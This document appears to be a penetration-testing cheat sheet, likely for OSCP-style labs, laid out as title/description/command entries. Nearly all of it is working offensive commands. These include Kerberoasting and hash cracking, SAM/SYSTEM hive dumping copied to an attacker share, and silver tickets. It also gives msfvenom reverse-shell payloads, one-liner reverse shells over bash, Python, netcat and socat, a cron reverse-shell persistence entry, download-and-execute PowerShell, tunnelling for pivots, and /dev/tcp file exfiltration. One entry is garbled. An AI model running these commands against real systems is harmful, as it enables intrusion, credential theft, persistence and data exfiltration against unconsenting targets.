nxc smb <TARGET_SUBNET> -u <USER> -p '<PASS>'

# Test local account reuse across the subnet.
nxc smb <TARGET_SUBNET> -u <USER> -p '<PASS>' --local-auth

commands.title: SYSVOL Looting
commands.description: Search SYSVOL for interesting files.
commands.command: smbclient //<DC_IP>/SYSVOL -U '<DOMAIN>/<USER>%<PASS>'

commands.title: Targeted Kerberoast To ForceChangePassword
commands.description: When BloodHound shows a path through `GenericAll` or `ForceChangePassword`, roast the next user, crack the TGS, reset the next credential, then validate RDP/SMB.
commands.command:
# Roast the target user added by the ACL path.
targetedKerberoast.py -v -d <DOMAIN> -u <USER> -p '<PASS>' --dc-ip <DC_IP>

# Crack the captured TGS.
echo '<TGS_HASH>' > targeted.hash
hashcat -m 13100 targeted.hash <WORDLIST>

# Reset the next user password through RPC.
rpcclient -N <DC_HOST> -U '<TARGET_USER>%<TARGET_PASS>'
setuserinfo2 <NEXT_USER> 23 '<NEW_PASS>'

# Alternative reset with net rpc.
net rpc password '<NEXT_USER>' '<NEW_PASS>' -U '<DOMAIN>/<TARGET_USER>%<TARGET_PASS>' -S <DC_HOST>

# Verify and use the new credential.
nxc smb <DC_HOST> -u <NEXT_USER> -p '<NEW_PASS>'
xfreerdp3 /u:<NEXT_USER> /p:'<NEW_PASS>' /v:<DC_HOST> /dynamic-resolution /cert:ignore +clipboard

commands.title: Test anonymous LDAP bind.
commands.command: nxc ldap <DC_IP> -u '' -p ''

commands.title: Test authenticated LDAP access.
commands.command: nxc ldap <DC_IP> -u <USER> -p '<PASS>'

commands.title: Test SMB null session.
commands.description: Try SMB null session.
commands.command: nxc smb <DC_IP> -u '' -p ''

commands.title: User Enumeration
commands.description: Enumerate valid usernames with Kerbrute before roasting or spraying.
commands.command:
# User enumeration, no password needed.
kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USERLIST> -o valid_users.txt

# Extract valid usernames into users.txt.
grep -a "VALID USERNAME:" valid_users.txt | awk -F'[@ ]+' '{print tolower($(NF-1))}' | sort -u | grep -vxFf users.txt >> users.txt

commands.title: WinRM With Evil-WinRM
commands.description: Check WinRM access and connect with Evil-WinRM.
commands.command:
# Check whether WinRM accepts the credential.
nxc winrm <TARGET_IP> -u <USER> -p '<PASS>'

# Open an interactive WinRM shell.
evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>'

# Load PowerShell scripts and executables from local tool folders.
evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>' -s /opt/tools/ps_scripts/
evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>' -e /opt/tools/executables/

# Pass-the-hash when only the NTLM hash is available.
evil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>

# Inside Evil-WinRM.
upload /local/file.exe C:\Temp\file.exe
download C:\sensitive\file.txt /local/
menu

commands.title: WinRM With PowerShell Remoting
commands.description: Use native PowerShell remoting with a credential object.
commands.command:
$username = '<USER>'
$password = '<PASS>'
$secureString = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString
New-PSSession -ComputerName <TARGET_HOST> -Credential $credential
Enter-PSSession 1

commands.title: WinRM With WinRS
commands.description: Use `winrs` for a simple remote shell or command execution over WinRM.
commands.command:
# Open an interactive WinRS shell.
winrs -r:<TARGET_HOST> -u:<USER> -p:<PASS> cmd

# Run a one-off command over WinRS.
winrs -r:<TARGET_HOST> -u:<USER> -p:<PASS> "cmd /c hostname & whoami"

# Execute an encoded PowerShell payload over WinRS.
winrs -r:<TARGET_HOST> -u:<USER> -p:<PASS> "powershell -nop -w hidden -e <BASE64_PAYLOAD>"

commands.title: WMI Exec With Password
commands.description: Use Impacket WMI execution with valid domain or local admin credentials.
commands.command: impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>

commands.title: Identify Hashes
commands.description: Identify a hash type before choosing John or Hashcat mode.
commands.command:
# Classic interactive helper.
hash-identifier

# haiti.
haiti '<HASH_VALUE>'
haiti --no-color '<HASH_VALUE>'

# name-that-hash.
nth -t '<HASH_VALUE>'
nth -f hash_file.txt
nth -t '<HASH_VALUE>' --hashcat
nth -t '<HASH_VALUE>' --john

commands.title: Kerberos Family
commands.description: Quick crack reference for Kerberos roast hashes.
commands.command:
# Kerberoast RC4
hashcat -m 13100 -a 0 hash.txt <WORDLIST>
john --format=krb5tgs hash.txt --wordlist=<WORDLIST>

# Kerberoast AES128
hashcat -m 19600 -a 0 hash.txt <WORDLIST>

# ASREP roast
hashcat -m 18200 -a 0 hash.txt <WORDLIST>

# Timeroast
hashcat -m 31300 -a 3 hash.txt -w 3 ?l?l?l?l?l?l?l

commands.title: Linux Hashes
commands.description: Crack a copied Linux passwd-style hash offline.
commands.command:
# Attacker: save the hash line in root.hash.
cat root.hash

# Attacker: crack and show the recovered password.
john root.hash --wordlist=/usr/share/wordlists/rockyou.txt
john --show root.hash

commands.title: NTLM Family - Hashcat Modes
commands.description: Quick crack reference for LM, NT, NetNTLMv1, and NetNTLMv2 hashes.
commands.command:
# LM
hashcat -m 3000 -a 0 hash.txt <WORDLIST>
john --format=lm hash.txt --wordlist=<WORDLIST>

# NT
hashcat -m 1000 -a 0 hash.txt <WORDLIST>
john --format=nt hash.txt --wordlist=<WORDLIST>

# NetNTLMv1
hashcat -m 5500 -a 0 hash.txt <WORDLIST>
john --format=netntlm hash.txt --wordlist=<WORDLIST>

# NetNTLMv2
hashcat -m 5600 -a 0 hash.txt <WORDLIST>
john --format=netntlmv2 hash.txt --wordlist=<WORDLIST>

commands.title: NTLM Family - John Brute Force
commands.description: Brute-force NT and NetNTLM hashes when wordlists fail.
commands.command:
# NT hash.
john --format=nt hash.txt
hashcat -m 1000 -a 3 hash.txt

# NetNTLMv1.
john --format=netntlm hash.txt
hashcat -m 5500 -a 3 hash.txt

# NetNTLMv2.
john --format=netntlmv2 hash.txt
hashcat -m 5600 -a 3 hash.txt

commands.title: NTLM Family - NetNTLMv2 Wordlist
commands.description: Crack NetNTLMv2 with a specific wordlist.
commands.command:
john --wordlist=<WORDLIST> --format=netntlmv2 hash.txt
hashcat -m 5600 -a 0 hash.txt <WORDLIST>

commands.title: Other Windows Hashes - MSCache And SCCM PXE
commands.description: Crack other Windows-oriented hashes.
commands.command:
# MSCache v2 / DCC2
hashcat -m 2100 -a 0 hash.txt <WORDLIST>

# DCC2 can be slow. Save the target hash and run a focused wordlist attack.
echo '<DCC2_HASH>' > dcc2.hash
hashcat -m 2100 dcc2.hash <WORDLIST>

# SCCM PXE
hashcat -m 19850 -a 0 hash.txt <WORDLIST>

commands.title: Protected File Hashes - 7z
commands.description: Extract and crack 7z archive passwords.
commands.command:
7z2john archive.7z > 7z.hash
john 7z.hash --wordlist=<WORDLIST>

# Quick test a password list directly with 7za.
cat <WORDLIST> | 7za t archive.7z

commands.title: Protected File Hashes - GPG Private Key
commands.description: Crack a passphrase-protected GPG private key, then decrypt the protected file.
commands.command:
# Copy both the encrypted file and the private key material locally.
scp <USER>@<TARGET_IP>:/path/to/credential.pgp .
scp <USER>@<TARGET_IP>:/path/to/private.asc .

# Crack the private key passphrase.
gpg --import private.asc
gpg2john private.asc > gpg.hash
john gpg.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Import the key and decrypt the protected file using the cracked passphrase.
gpg --import private.asc
gpg --decrypt credential.pgp

commands.title: Protected File Hashes - KeePass
commands.description: Extract and crack KeePass database passwords.
commands.command:
# Target: find KeePass databases.
dir C:\Users\Administrator /s /b 2>nul | findstr /i "\.kdbx"

# Attacker: crack the KeePass database.
keepass2john Creds.kdbx > keepass.hash
john keepass.hash --wordlist=<WORDLIST>
hashcat -m 13400 keepass.hash <WORDLIST> -r /usr/share/hashcat/rules/rockyou-30000.rule --force

commands.title: Protected File Hashes - Looted Backup ZIP
commands.description: When you find a readable/writable backup ZIP on a target, copy it locally, crack the archive password, then extract it.
commands.command:
# Target: find interesting writable/readable backup files.
find / -writable -type f 2>/dev/null | grep -Ev "/proc|/sys|/dev"

# Attacker: receive the file over a raw TCP listener.
nc -lvnp <LPORT> > sitebackup.zip

# Target: send the ZIP back to the attacker.
cat /opt/backup/sitebackup.zip > /dev/tcp/<LHOST>/<LPORT>

# Alternative: copy with SSH if you have credentials.
scp <USER>@<TARGET_IP>:/opt/backup/sitebackup.zip .

# Attacker: crack and extract.
7z x sitebackup.zip
zip2john sitebackup.zip > sitebackup.hash
john sitebackup.hash --wordlist=/usr/share/wordlists/rockyou.txt
7z x sitebackup.zip -p<PASS>

commands.title: Protected File Hashes - Office
commands.description: Extract and crack Microsoft Office document passwords.
commands.command:
office2john file.docx > office.hash
office2john file.xlsx > office.hash
john office.hash --wordlist=<WORDLIST>

commands.title: Protected File Hashes - PDF
commands.description: Crack or decrypt protected PDF files.
commands.command:
pdf2john file.pdf > pdf.hash
john pdf.hash --wordlist=<WORDLIST>
pdfcrack file.pdf -w <WORDLIST>

# Decrypt after recovering the password.
qpdf --password=<PASS> --decrypt encrypted.pdf plaintext.pdf

commands.title: Protected File Hashes - ZIP
commands.description: Extract and crack ZIP archive passwords with John.
commands.command:
zip2john creds.zip > creds.hash
john creds.hash --wordlist=/usr/share/wordlists/rockyou.txt
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt creds.zip

# Extract with the cracked password.
7z x creds.zip -p<PASS>

commands.title: Rules / Mutations
commands.description: Quick rule-based cracking reference for Hashcat and John.
commands.command:
# Identify the hash mode first.
hash-identifier

# Helpful built-in rules.
ls /usr/share/hashcat/rules/rockyou-30000.rule
ls /usr/share/john/rules/rockyou-30000.rule

# Custom Hashcat rule example.
echo '$1 $@ $3 $$ $5' > rules1
hashcat -m <MODE> hash.txt <WORDLIST> -r rules1 --potfile-disable

# Add this block to /etc/john/john.conf before using --rules=sshRules.
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@

# Custom John rule example.
john --wordlist=<WORDLIST> --rules=sshRules ssh.hash

# Stronger default Kerberoast mutation pass.
hashcat -m 13100 hashes.kerb <WORDLIST> -r /usr/share/hashcat/rules/best66.rule --force

commands.title: UltraVNC Password Decrypt
commands.description: Decrypt UltraVNC passwords from `ultravnc.ini`.
commands.command:
# Target: find UltraVNC encrypted password values.
type "C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini"

# Attacker: decrypt the DES-encrypted VNC password.
echo -n <VNC_HEX_PASS> | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv

commands.title: Backup Artifact Discovery With Ohmybackup
commands.description: Use `ohmybackup` to scan for backup directories and files on a target site.
commands.command:
git clone https://github.com/tismayil/ohmybackup.git
cd ohmybackup
go run ohmybackup.go --hostname <TARGET_HOST>
go build ohmybackup.go
./ohmybackup --hostname <TARGET_HOST>

commands.title: Backup Artifact Wordlist Scan
commands.description: Scan for backup files, swap files, archive copies, and old source/database dumps.
commands.command:
# Backup/swap/archive variants around common index filenames.
ffuf -u http://<TARGET_IP>/FUZZ -w <(printf "index.php
.index.php
.#index.php
index
.index
") -e .swp,.zip,.tar.gz,.bzip,.rar,.gzip,.7z,.bak,.backup,.old,.original,.orig,.save,.sql,.tmp,.gho -mc 200,301,302,403 -fs 0 -t 50

# Quick Vim swap/backup pass.
ffuf -u http://<TARGET_IP>/FUZZ -w <(printf "index.php
.index.php
.#index.php
index
.index
") -e .swp,.swo,.swn,.bak -mc 200,301,302,403 -fs 0

commands.title: Directory Discovery
commands.description: Quick directory and file discovery reference.
commands.command:
# Quick feroxbuster pass.
feroxbuster -u http://<TARGET_IP>

# Custom wordlist with feroxbuster.
feroxbuster -u http://<TARGET_IP> -w <WORDLIST>

# Directory fuzzing with ffuf.
ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/wordlists/dirb/big.txt

# Directory fuzzing with extensions.
ffuf -w <WORDLIST> -u http://<TARGET_IP>/FUZZ -e .aspx,.html,.php,.txt

# Gobuster directory scan.
gobuster dir -u http://<TARGET_IP>/ -w raft-medium-words.txt

# Smaller DirBuster list.
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

# Dirsearch pass.
dirsearch -u http://<TARGET_IP>/
dirsearch -u http://<TARGET_IP>/ -e php,txt,html,bak,zip -o dirsearch.txt
dirsearch -u http://<TARGET_IP>/ -w <WORDLIST> -o dirsearch.txt

# Feroxbuster with useful extensions.
feroxbuster -u http://<TARGET_IP> -x php,txt,html,json

commands.title: Drupal CMS Scan
commands.description: Scan a Drupal site, then search Metasploit for matching Drupal exploit modules.
commands.command:
droopescan scan -u http://<TARGET_IP>

msfconsole
search drupal_dru

commands.title: Exposed Git Repository
commands.description: If `/.git/` is exposed, dump the repository, review source, and inspect commit history for removed secrets.
commands.command:
# Confirm the finding.
nmap -sC -sV -p <PORT> <TARGET_IP>
curl -i http://<TARGET_IP>/.git/HEAD

# Attacker: install git-dumper once, then dump the exposed repository.
git clone https://github.com/arthaud/git-dumper
cd git-dumper
pip install -r requirements.txt
python3 git_dumper.py http://<TARGET_IP>/.git/ dumped_repo

# Review source for credentials and secrets.
cd dumped_repo
grep -RiaE "pass|password|passwd|pwd|secret|token|key|db|database" .

# Review history for secrets that were deleted later.
git log
git log -p
git show <COMMIT_ID>
git grep -i password $(git rev-list --all)

commands.title: Joomla CMS Scan
commands.description: Scan a Joomla site and enumerate components.
commands.command: joomscan -u http://<TARGET_IP> -ec

commands.title: Metadata Extraction
commands.description: Check downloaded documents for usernames, authors, software versions, or internal paths.
commands.command:
# Extract author metadata from downloaded PDF templates.
exiftool *TEMPLATE.pdf | grep Author

commands.title: Nuclei Scan
commands.description: Run a quick Nuclei pass for known CVEs and exposed configs.
commands.command:
nuclei -update-templates
nuclei -u http://<TARGET_IP>
nuclei -u http://<TARGET_IP> -severity critical,high
nuclei -u http://<TARGET_IP> -t cves/2021/
nuclei -u http://<TARGET_IP> -t exposures/configs/
nuclei -l targets.txt -severity high,critical -o nuclei-results.txt

commands.title: Scripts
commands.description: Run a broad safe/discovery/vuln NSE pass after the initial scan.
commands.command: nmap --script vuln,safe,discovery -oN nmap/scripts <TARGET_IP>

commands.title: Subdomain Discovery
commands.description: Quick subdomain and vhost discovery reference.
commands.command:
# DNS brute force with gobuster.
gobuster dns -d <DOMAIN> -w subdomains-top1million-110000.txt

# Virtual host fuzzing with ffuf.
ffuf -w subdomains.txt -u http://<DOMAIN>/ -H "Host: FUZZ.<DOMAIN>"
ffuf -u http://<TARGET_HOST>/ -H "Host: FUZZ.<DOMAIN>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302,403

# Vhost discovery with gobuster.
gobuster vhost -u http://<DOMAIN>/ -w <WORDLIST>
gobuster vhost -u http://<TARGET_HOST> --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain

# DNS brute force with dnsrecon.
dnsrecon -d <DOMAIN> -D /usr/share/seclists/Discovery/DNS/namelist.txt -t brt

# Ask a known DNS server for current records.
dig <DOMAIN> ANY +noall +answer @<DNS_IP>

commands.title: TCP
commands.description: Quick TCP scan reference from a default pass to a full aggressive scan.
commands.command:
# Fast common-port scan.
nmap -T4 -F <TARGET_IP>

# Default scripts and version detection.
nmap -sC -sV -oN nmap/default <TARGET_IP>

# Full TCP port scan with service detection.
nmap -Pn -sC -sV -p- -oN nmap/tcp-all <TARGET_IP>
nmap -sV -sC -p- <TARGET_IP> -oN scan_<TARGET_IP>.txt

# Aggressive full scan.
nmap -vv -Pn -A -sC -sS -T4 -p- <TARGET_IP> -oN nmap/fullscan

commands.title: Technology Fingerprinting

msfconsole -q -x "use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST <LHOST>; set LPORT <LPORT>; run"

commands.title: MSFvenom Payloads
commands.description: Generate common reverse-shell payloads for Windows, Linux, JSP/WAR, ASP/ASPX, PHP, and Unix command payloads.
commands.command:
# Windows EXE / DLL / MSI.
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x64/xor_dynamic -f exe -o shell_en.exe
msfvenom -p windows/shell/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe
msfvenom -p windows/adduser USER=<USER> PASS=<PASS> -f exe -o useradd.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o shell.dll
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o installer.msi
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o metershell.exe

# Linux ELF.
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf
msfvenom -p linux/x64/shell_bind_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell_bind.elf

# Web payloads.
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.jsp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f asp -o metershell.asp
msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php

# Unix command payloads.
msfvenom -p cmd/unix/reverse_python LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.py
msfvenom -p cmd/unix/reverse_bash LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.sh
msfvenom -p cmd/unix/reverse_perl LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.pl

# Discovery helpers.
msfvenom -l payloads
msfvenom -p <PAYLOAD> --list-options

commands.title: Python Reverse Shell
commands.description: Python3 reverse shell one-liner when Bash TCP is not reliable.
commands.command: python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

commands.title: Reverse Shell
commands.description: Catch a reverse shell from a target that has Netcat with `-e` support.
commands.command:
# 1. Start the listener on the attacker box.

nc -lvnp <LPORT>

# 2. Trigger the reverse shell on the target.

nc <LHOST> <LPORT> -e /bin/bash

commands.title: Windows Meterpreter Payloads
commands.description: Generate a Windows Meterpreter payload, catch it, trigger it from a Windows shell, and optionally execute a second stage.
commands.command:
# Attacker: generate the first Meterpreter executable.
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<LHOST> LPORT=<LPORT> -f exe -o newshell.exe

# Attacker: start the matching handler.
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <LHOST>
set LPORT <LPORT>
run

# Target PowerShell: download and execute the payload.
powershell "(New-Object System.Net.WebClient).DownloadFile('http://<LHOST>/newshell.exe', 'newshell.exe')"
Start-Process 'newshell.exe'

# Attacker/Meterpreter: optional second-stage payload.
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > admin.exe
upload /home/kali/Desktop/admin.exe admin.exe
execute -f admin.exe

commands.title: Chisel Reverse Port Forward
commands.description: Expose a Windows-only local service such as `127.0.0.1:3306` back to the attacker box.
commands.command:
# 1. Start the reverse server on Kali.

chisel server -p <LPORT> --reverse

# 2. Download and run the Windows client on the target.

iwr -Uri http://<LHOST>/chisel.exe -OutFile chisel.exe
.\chisel.exe client <LHOST>:<LPORT> R:3306:127.0.0.1:3306

# 3. Connect to the forwarded service from Kali.

mysql -u root -h 127.0.0.1 --skip-ssl

commands.title: Chisel Reverse SOCKS
commands.description: Expose a reverse SOCKS proxy through a Windows foothold.
commands.command:
# 1. Start the reverse server on Kali.

chisel server -p <LPORT> --reverse

# 2. Start the Windows client with a reverse SOCKS tunnel.

.\chisel.exe client <LHOST>:<LPORT> R:socks

# 3. Verify access through the proxy.

proxychains ping <TARGET_IP>

commands.title: Ligolo-ng Pivot
commands.description: Use Ligolo-ng when you have code execution on a pivot host and need routed access to an internal subnet.
commands.command:
# 1. Attacker: create and enable a Ligolo TUN interface.
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up

# 2. Attacker: start the Ligolo proxy.
sudo ./proxy -selfcert

# 3. Target Windows: download and run the Ligolo agent.
certutil.exe -urlcache -f http://<LHOST>/ligolo/agent.exe C:\Users\Public\agent.exe
C:\Users\Public\agent.exe -connect <LHOST>:11601 -ignore-cert

# 4. Attacker Ligolo console: select the session.
session

# 5. Option 1: use autoroute and select the discovered internal subnet.
autoroute

# 6. Option 2: start manually, inspect the internal IP, then add the route from Kali.
start
ifconfig
sudo ip route add <TARGET_SUBNET> dev ligolo

# 7. Cleanup if the interface already exists or routing looks stale.
sudo ip route flush cache
sudo ip link delete ligolo

commands.title: Proxychains To Internal MySQL
commands.description: Route local tools through proxychains when MySQL is only reachable through a tunnel or SOCKS proxy.
commands.command:
# Attacker: edit the proxychains config to point at the active SOCKS proxy.
sudo nano /etc/proxychains4.conf

# Attacker: connect to the internal MySQL listener through proxychains.
proxychains mysql -u root -h 127.0.0.1 --skip-ssl

# Attacker: run a quick query through the tunnel without creating a separate card.
proxychains mysql -u root -h 127.0.0.1 --skip-ssl -e "SHOW DATABASES;"

commands.title: Socat
commands.description: Use Socat for stable reverse shells, simple port forwards, or raw file transfers.
commands.command:
# Stable reverse shell listener on attacker.
socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>

# Victim reverse shell.
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>

# Port forward local listener to an internal service.
socat tcp-listen:8080,fork tcp:<INTERNAL_HOST>:80

# File transfer receiver and sender.
socat tcp-listen:<LPORT> open:received_file,creat
socat tcp-connect:<LHOST>:<LPORT> file:<FILE>

commands.title: Access Helpers
commands.description: Start the SSH service when you need inbound SSH access on a Linux target you control.
commands.command: sudo /etc/init.d/ssh start

commands.title: Active Directory Domain Admin User
commands.description: Add user to Domain Admins when you already have sufficient privileges.
commands.command: net group "Domain Admins" <USER> /add /domain

commands.title: Active Directory Silver Ticket With Mimikatz
commands.description: Create and inject a Kerberos service ticket with Mimikatz.
commands.command: mimikatz "kerberos::golden /sid:<DOMAIN_SID> /domain:<DOMAIN> /target:<TARGET_SERVER> /service:<TARGET_SERVICE> /aes256:<COMPUTER_AES256_KEY> /user:<ANY_USER> /ptt"

commands.title: Active Directory Silver Ticket With Ticketer
commands.description: Create a silver ticket.
commands.command: ticketer.py -nthash <MACHINE_NT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> <ANY_USER>

commands.title: Basic Info
commands.description: Quick domain context checks from a Windows shell.
commands.command:
:: Workstation and domain details.
net config workstation

:: Extract the joined domain from system info.
systeminfo | findstr /B /C:"Domain"

:: Current domain and logon server.
echo %USERDOMAIN%
echo %LOGONSERVER%

commands.title: Basic Info - Sudo Rights
commands.description: Check sudo rights.
commands.command: sudo -l

commands.title: Basic Info - System Context
commands.description: Basic system and user context.
commands.command:
id
hostname
uname -a

commands.title: Basic Info - Users And Homes
commands.description: List users and home directories.
commands.command:
cat /etc/passwd
ls -la /home

commands.title: Basic Info - Writable Paths
commands.description: Find interesting writable paths.
commands.command: find / -writable -type d 2>/dev/null

commands.title: Credential Dumping
commands.description: Use `SeBackupPrivilege` to save SAM/SYSTEM hives, copy them out, and dump hashes offline.
commands.command:
:: Target: save hives.
reg save hklm\system SYSTEM
reg save hklm\sam SAM

:: Attacker: expose an SMB share.
impacket-smbserver kali . -username <USER> -password <PASS> -smb2support

:: Target: copy hives to the attacker share.
net use \\<LHOST>\kali /user:<USER> <PASS>
copy SAM \\<LHOST>\kali\
copy SYSTEM \\<LHOST>\kali\

:: Attacker: extract hashes.
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

commands.title: Enable RDP
commands.description: Enable RDP after confirming you have admin-level remote command execution on the Windows target.
commands.command:
# Attacker: connect with admin-capable credentials.
impacket-psexec '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP>

# Target: allow RDP connections.
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Target: enable the Windows Firewall RDP group.
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# Target: start the RDP service and confirm port 3389 is listening.
sc start TermService
netstat -ano | findstr 3389

commands.title: Files And Loot - Password And Flag Strings
commands.description: Search quickly for passwords, flags, and suspicious filenames from `cmd`.
commands.command:
:: Search current directory tree for password strings.
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
findstr /si password *.xml *.ini *.txt

:: Search common file types across C:\ and only print matching filenames.
findstr /si /m "password" C:\*.xml C:\*.ini C:\*.txt

:: Build a path list and filter for password-looking filenames.
dir /b /a /s C:\ > dirs.txt
type dirs.txt | findstr /i passw

:: Search user profiles for flag files.
findstr /si /m "flag" C:\Users\*.txt
type C:\Users\*\flag.txt

commands.title: Files And Loot - Recycle Bin
commands.description: Check the Recycle Bin for copied hives or backup files.
commands.command:
dir 'C:\$Recycle.Bin' -Force
dir 'C:\$Recycle.Bin\<SID>' -Force
mv 'C:\$Recycle.Bin\<SID>\sam.bak' 'C:\Users\<USER>\SAM'
mv 'C:\$Recycle.Bin\<SID>\system.bak' 'C:\Users\<USER>\SYSTEM'

commands.title: Files And Loot - Shell History
commands.description: Check PowerShell and CMD command history for reused credentials and paths.
commands.command:
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
doskey /history

commands.title: Files And Loot - User Documents And Configs
commands.description: Search common user and application paths for documents and config loot.
commands.command:
# Broad search under user profiles while skipping noisy AppData-style paths.
cmd /c dir "C:\Users" /s /a /b | findstr /i /v /c:"\AppData\" /c:"Application Data" /c:"All Users" /c:"Local Settings"

# Common document types in one user profile.
Get-ChildItem -Path C:\Users\<USER>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

# Likely config loot under XAMPP.
Get-ChildItem -Path C:\xampp\ -Include *.ini -File -Recurse -ErrorAction SilentlyContinue

commands.title: Files And Loot - Windows.old Hives
commands.description: Search `C:\Windows.old` for backup SAM/SYSTEM hives after an upgrade or reinstall.
commands.command:
# PowerShell search.
Get-ChildItem C:\Windows.old -Recurse -ErrorAction SilentlyContinue -Include *sam*
Get-ChildItem C:\Windows.old -Recurse -ErrorAction SilentlyContinue -Include *system*

# cmd search.
dir C:\Windows.old\*sam* /s /b
dir C:\Windows.old\*system* /s /b

# Evil-WinRM or similar shell: download the discovered hives.
download SAM
download SYSTEM

commands.title: Linux
commands.description: Quick Linux file download and copy reference.
commands.command:
# HTTP downloads
wget http://<LHOST>/<FILE> -O <OUTPUT_FILE>
curl http://<LHOST>/<FILE> -o <OUTPUT_FILE>

# Python fallback when wget/curl are missing.
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://<LHOST>:<LPORT>/<FILE>", "/tmp/<FILE>")'
chmod +x /tmp/<FILE>

# Copy over SSH
scp <FILE> <USER>@<TARGET_IP>:<REMOTE_PATH>
scp <USER>@<TARGET_IP>:/path/to/<FILE> .
scp <FILE> <USER>@<TARGET_IP>:/path/to/dest/

commands.title: Linux Crontab Check
commands.description: Check if crontab exists.
commands.command: which crontab

commands.title: Linux Crontab Edit
commands.description: Edit current user's crontab.
commands.command: crontab -e

commands.title: Linux Reverse Shell Cron
commands.description: Append reverse shell cron entry without interactive editor.
commands.command: (crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'") | crontab -

commands.title: Local Databases
commands.description: Check for a local XAMPP MySQL instance with an empty root password and enumerate stored data.
commands.command:
# Move into the MySQL client directory.
cd C:\xampp\mysql\bin

# List databases and inspect interesting tables.
.\mysql.exe -uroot --password="" -e "SHOW DATABASES;"
.\mysql.exe -uroot --password="" -e "SHOW TABLES FROM <DB_NAME>;"
.\mysql.exe -uroot --password="" -e "SELECT * FROM <DB_NAME>.<TABLE_NAME>;"

commands.title: Netcat
commands.description: Transfer a file over Netcat or use Windows `nc.exe`/`ncat.exe` for shells and file movement.
commands.command:
# Option 1: simple listener / sender pair.
nc -lvp <LPORT> < <FILE>
nc <LHOST> <LPORT> > <FILE>

# Option 2: explicit listener then send the file.
nc -q 0 -lvp 443 > file
nc -nv <LHOST> 443 < file

# Windows reverse shell with nc.exe.
nc.exe -nv <LHOST> <LPORT> -e cmd.exe
nc.exe -nv <LHOST> <LPORT> -e powershell.exe

# Windows file transfer.
nc.exe -lvnp <LPORT> > received_file.exe
nc.exe <LHOST> <LPORT> < file_to_send.exe

commands.title: Penelope Session Manager
commands.description: Use Penelope as an OSCP-safe shell listener and session manager when you want easier upgrades, transfers, and simple port forwarding.
commands.command:
# Attacker: start a Penelope listener.
python3 penelope.py --oscp-safe -p <LPORT>

# Trigger a reverse shell through a command-execution webshell.
curl -G 'http://<TARGET_HOST>/<WEBSHELL_PATH>' --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"

# Connect to a bind shell instead of waiting for a reverse shell.
connect <TARGET_IP> <PORT>

# Show sessions, select one, and upgrade it.
sessions
use 1
upgrade

# Interact with or detach from a session.
interact 1
F12

# Execute one-off commands or run an enum script.
exec whoami
script linpeas.sh

# Upload and download files.
upload linpeas.sh
download /home/<USER>/.ssh/id_rsa

# Manage sessions and listeners.
kill 1
listeners

